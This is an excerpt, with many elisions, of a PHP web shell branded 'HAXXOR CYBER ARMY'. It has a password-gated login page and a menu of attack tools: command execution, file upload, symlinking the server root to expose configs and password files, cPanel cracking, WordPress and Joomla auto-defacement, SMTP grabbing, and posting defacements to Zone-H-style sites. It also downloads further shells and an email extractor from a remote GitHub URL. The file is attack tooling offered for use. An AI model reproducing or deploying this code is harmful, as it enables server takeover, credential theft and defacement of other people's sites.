...
$lol="63a9f0ea7bb98050796b649e85481845";
function printLogin() { 
    ?> 
<html>
<head>
<title>HAXXOR CYBER ARMY</title>
<link href='https://raw.githubusercontent.com/haxxorteam/haxxor/main/img.png' rel='icon' type='image/x-icon'/>
...
input[type=text], input[type=password],input[type=submit] {
    ...
    <center><br>
<img src="https://raw.githubusercontent.com/haxxorteam/haxxor/main/img.png" width="200"/>
<div align="center">
<pre style="font: 20px/10px courier;"><b><script language="JavaScript1.2">
var message="HAXXOR CYBER ARMY TEAM - SHELL"
var neonbasecolor="lime"
...
beginneon()
    ...
    <br><font color="red" size="4"><br>HCA-TEAM:<br></font><form method=post> 
	<br><font color="lime" size="4">=====:::: MARG4R1T4 - EMP3 - ZEKI - SAKE - JACK DANIEL'S - JHONIE WALKER - T3QUILA - BAC4RDI ::::=====<br></font><form method=post> 
<br><font color="lime" size="2"><br>Enter The Password !!<br></font><form method=post> 
 <input type=password name=haxxor> 
    </form></center> 
    <?php 
...
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $lol ) || 
        ( isset( $_POST['haxxor'] ) && ( md5($_POST['haxxor']) == $lol ) ) ) 
...
<title>HAXXOR CYBER ARMY</title>
<link href='https://raw.githubusercontent.com/haxxorteam/haxxor/main/img.png' rel='icon' type='image/x-icon'/>
<meta name='author' content='haxxorteam'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Abel);
html {
...
$c = "/haxxor_tools/".$names.".php";
if (file_exists('haxxor_tools/'.$names.'.php')){
	echo '<script type="text/javascript">alert("HCA-TOOLS DONE !");window.location.href = "haxxor_tools/'.$names.'.php";</script> ';
	}
	else {mkdir("haxxor_tools", 0777);
file_put_contents('haxxor_tools/'.$names.'.php', file_get_contents($lokasi));
echo ' <script type="text/javascript">alert("Done");window.location.href = "haxxor_tools/'.$names.'.php";</script> ';}}}

CreateTools("Mini Shell","https://raw.githubusercontent.com/haxxorteam/haxxor/main/mini.php");
CreateTools("extractor","https://raw.githubusercontent.com/haxxorteam/haxxor/main/DB-Email.php");
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($_GET['dir']);
} else {
...
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=upload'>Upload</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=cmd'>Command</a> ]</li>";
...
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=symlink'>Symlink</a> ]<br></li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=cpanel'>CPanel Crack</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=zoneh'>Zone-H</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=zone-xsec'>Zone-Xsec</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=defacerid'>Defacer.ID</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=cgi'>CGI Telnet</a> ]</li><br>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=adminer'>Adminer</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=fake_root'>Fake Root</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=auto_cu_wp'>WordPress Auto Edit User V.2</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=auto_cu_joomla'>Joomla Auto Edit User V.2</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=passwbypass'>Bypass etc/passw</a> ]<br></li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=loghunter'>Log Hunter</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=shellchk'>Shell Checker</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=shelscan'>Shell Finder</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=zip'>Zip Menu</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=injectcode'>Code Inject</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=about'>About</a> ]</li>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=magen'>Magento DB Info</a> ]</li><br>";
echo "<li>[ <a style='color:lime' href='?dir=$dir&do=metu'>LogOut</a> ]<br></li>";
echo "</ul>";
echo "</center>";
echo "<hr>";
if($_GET['do'] == 'upload') {
 ...
 elseif($_GET['do'] == 'cmd') {
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By HAXXOR CYBER ARMY</textarea><br>
...
elseif($_GET['do'] == 'about') {
    ...
    echo '<center>HAXXOR CYEBR ARMY - Extreme Crew';
...
if($_POST['gass']) {
	...
	echo"</textarea><br>
		...
		<form method='post'>
		Link Config: <br>
		<input type='text' name='linkconf' height='10' size='50' placeholder='http://link.com/haxxor_symconf/'><br>
...
@mkdir("haxxor_symconf", 0777);
@chdir("haxxor_symconf");
@symlink("/","root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex haxxor.htm
...
$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/haxxor_symconf/";
$re=$r;
...
echo "<center>
<a href=\"haxxor_symconf/root/\">Root Server</a>
<br><a href=\"haxxor_symconf/Passwords.txt\">Passwords</a>
<br><a href=\"haxxor_symconf/\">Configurations</a></center>";
}
else
{
echo "<center>
...
<td>".$user['name']."</td>
<td><a href='$full/haxxor_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
...
Satisfy Any';
 ...
 echo "<td align=center><font class=txt><a href=$full/haxxor_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("haxxor_sym",0777);@chdir("haxxor_sym");@exe("ln -s / root");$file3 = '
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Zeki'><br>
		<u>Team</u>: <br>
...
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://zone-xsec.com/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
 ...
 elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>Nemu ".$i." Cpanel by <font color=lime>haxxor</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked By HAXXOR CYBER ARMY' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='HAXXOR CYEBR ARMY'><br>
		<u>Domains</u>: <br>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>Sukses Deface ".$i." Cpanel by <font color=lime>haxxor.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
...
//
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By HAXXOR CYBER AMRY' required><br>
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By HAXXOR CYBER ARMY' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
...
<select onchange='if (this.value) window.open(this.value);'>
   ...
   <option value='$ling=Mini Shell'>MINI SHELL</option>
</select>
<select onchange='if (this.value) window.open(this.value);'>
